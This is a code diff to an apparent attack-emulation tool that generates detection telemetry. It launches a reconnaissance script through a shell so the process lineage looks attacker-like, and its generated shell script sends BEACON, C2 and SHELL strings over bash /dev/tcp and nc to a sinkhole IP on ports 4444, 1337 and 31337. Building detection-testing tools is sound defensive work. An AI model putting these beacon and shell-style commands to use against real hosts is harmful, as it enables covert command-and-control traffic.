@@ -898,9 +898,14 @@ if __name__ == "__main__":
             info!("Created Python reconnaissance script: {script_file}");
             info!("Executing Python reconnaissance...");
 
-            // Execute the reconnaissance script
-            let output = Command::new("python3")
-                .arg(&script_file)
+            // Execute via /bin/sh -c so the process tree is signalbench -> sh
+            // -> python3 rather than signalbench -> python3 directly. Real
+            // attackers invariably invoke Python through a shell; behavioural
+            // rules calibrated on Linux endpoints expect that lineage.
+            let shell_command = format!("python3 {script_file}");
+            let output = Command::new("/bin/sh")
+                .arg("-c")
+                .arg(&shell_command)
                 .output()
                 .await
                 .map_err(|e| format!("Failed to execute reconnaissance script: {e}"))?;
@@ -1098,14 +1103,18 @@ impl AttackTechnique for UncommonRemoteShellCommands {
                     "[DRY RUN] Would execute uncommon commands: {}",
                     cmd_names.join(", ")
                 );
+                info!("[DRY RUN] Would resolve sinkhole.signalbench.sigre.xyz (fallback 198.135.184.22); on fallback, traffic is unidirectional (send-only)");
                 return Ok(SimulationResult {
                     technique_id: self.info().id,
                     success: true,
-                    message: format!("DRY RUN: Would execute {command_count} uncommon commands"),
+                    message: format!("DRY RUN: Would execute {command_count} uncommon commands; network targets resolve sinkhole.signalbench.sigre.xyz (fallback 198.135.184.22)"),
                     artifacts: vec![log_file],
                     cleanup_required: false,
                 });
             }
+
+            let sinkhole_ip = crate::techniques::resolve_sinkhole_ip().await;
+            let is_fallback = sinkhole_ip == crate::techniques::SINKHOLE_IP_FALLBACK;
 
             // Create the log file
             let mut log =
@@ -1128,21 +1137,22 @@ impl AttackTechnique for UncommonRemoteShellCommands {
                 // Outbound connections to known bad ports generate network telemetry
                 let script_content = format!(
                     r#"#!/bin/sh
-echo 'SignalBench telemetry generator - {} executed'
-echo 'Timestamp: {}'
-echo 'User: {}'
+echo 'SignalBench telemetry generator - {0} executed'
+echo 'Timestamp: {1}'
+echo 'User: {2}'
 # Outbound connection attempts to known bad ports (generates network telemetry)
 echo 'Attempting outbound connections to suspicious ports...'
-timeout 2 bash -c 'echo "BEACON" > /dev/tcp/198.135.184.22/4444' 2>/dev/null || true
-timeout 2 bash -c 'echo "C2" > /dev/tcp/198.135.184.22/1337' 2>/dev/null || true
-timeout 2 bash -c 'echo "SHELL" > /dev/tcp/198.135.184.22/31337' 2>/dev/null || true
-timeout 2 nc -zv 198.135.184.22 4444 2>&1 || true
-timeout 2 nc -zv 198.135.184.22 1337 2>&1 || true
+timeout 2 bash -c 'echo "BEACON" > /dev/tcp/{3}/4444' 2>/dev/null || true
+timeout 2 bash -c 'echo "C2" > /dev/tcp/{3}/1337' 2>/dev/null || true
+timeout 2 bash -c 'echo "SHELL" > /dev/tcp/{3}/31337' 2>/dev/null || true
+timeout 2 nc -zv {3} 4444 2>&1 || true
+timeout 2 nc -zv {3} 1337 2>&1 || true
 echo 'Network telemetry generation complete'
 "#,
                     cmd_name,
                     chrono::Local::now().to_rfc3339(),
-                    whoami::username()
+                    whoami::username(),
+                    sinkhole_ip
                 );
 
                 let mut script_file = File::create(cmd_path)
@@ -1157,26 +1167,36 @@ echo 'Network telemetry generation complete'
 
                 // Execute the uncommon command
                 info!("Executing uncommon command: {cmd_name}");
-                let output = Command::new(cmd_path).output().await;
-
-                match output {
-                    Ok(output) => {
-                        writeln!(log, "Exit Code: {}", output.status.code().unwrap_or(-1))
-                            .map_err(|e| format!("Failed to write to log file: {e}"))?;
-                        writeln!(log, "Output:")
-                            .map_err(|e| format!("Failed to write to log file: {e}"))?;
-                        log.write_all(&output.stdout)
-                            .map_err(|e| format!("Failed to write to log file: {e}"))?;
-                        if !output.stderr.is_empty() {
-                            writeln!(log, "Stderr:")
+                if is_fallback {
+                    // Run via spawn_blocking so the tokio executor is not blocked; await
+                    // completion for deterministic telemetry emission but discard exit code
+                    // (the script already uses || true on each network line).
+                    let cmd_path_owned = cmd_path.to_owned();
+                    let _ = tokio::task::spawn_blocking(move || {
+                        let _ = std::process::Command::new(&cmd_path_owned).output();
+                    })
+                    .await;
+                } else {
+                    let output = Command::new(cmd_path).output().await;
+                    match output {
+                        Ok(output) => {
+                            writeln!(log, "Exit Code: {}", output.status.code().unwrap_or(-1))
                                 .map_err(|e| format!("Failed to write to log file: {e}"))?;
-                            log.write_all(&output.stderr)
+                            writeln!(log, "Output:")
+                                .map_err(|e| format!("Failed to write to log file: {e}"))?;
+                            log.write_all(&output.stdout)
+                                .map_err(|e| format!("Failed to write to log file: {e}"))?;
+                            if !output.stderr.is_empty() {
+                                writeln!(log, "Stderr:")
+                                    .map_err(|e| format!("Failed to write to log file: {e}"))?;
+                                log.write_all(&output.stderr)
+                                    .map_err(|e| format!("Failed to write to log file: {e}"))?;
+                            }
+                        }
+                        Err(e) => {
+                            writeln!(log, "Error executing command: {e}")
                                 .map_err(|e| format!("Failed to write to log file: {e}"))?;
                         }
-                    }
-                    Err(e) => {
-                        writeln!(log, "Error executing command: {e}")
-                            .map_err(|e| format!("Failed to write to log file: {e}"))?;
                     }
                 }
 
